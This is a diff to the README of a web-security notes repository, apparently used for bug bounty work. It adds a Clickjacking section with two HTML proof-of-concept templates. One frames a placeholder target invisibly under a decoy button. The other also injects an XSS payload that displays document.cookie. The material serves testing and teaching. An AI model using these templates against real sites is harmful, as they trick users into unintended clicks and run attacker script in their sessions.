@@ -38,7 +38,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Cross-site scripting (XSS)](#cross-site-scripting-xss)
   - [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
   - [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
-  - Clickjacking
+  - [Clickjacking](#clickjacking)
   - DOM-based vulnerabilities
   - Websockets
   - [Insecure deserialization](#insecure-deserialization)
@@ -939,6 +939,52 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 
 **Tools**
 - [Corsy](https://github.com/s0md3v/Corsy) Corsy is a lightweight program that scans for all known misconfigurations in CORS implementations
+
+
+
+### <ins>Clickjacking</ins>
+
+**Classic PoC**
+```HTML
+<style>
+  iframe {
+    position:relative;
+    width:$width_value;
+    height: $height_value;
+    opacity: $opacity;
+    z-index: 2;
+  }
+  div {
+    position:absolute;
+    top:$top_value;
+    left:$side_value;
+    z-index: 1;
+  }
+</style>
+<div>Click me button</div>
+<iframe src="$url"></iframe>
+```
+
+**Classic PoC + XSS**
+```
+<style>
+  iframe {
+    position:relative;
+    width:$width_value;
+    height: $height_value;
+    opacity: $opacity;
+    z-index: 2;
+  }
+  div {
+    position:absolute;
+    top:$top_value;
+    left:$side_value;
+    z-index: 1;
+  }
+</style>
+<div>Click me</div>
+<iframe src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker.website.com&subject=test&message=test#feedbackResult"></iframe>
+```
 
 
 
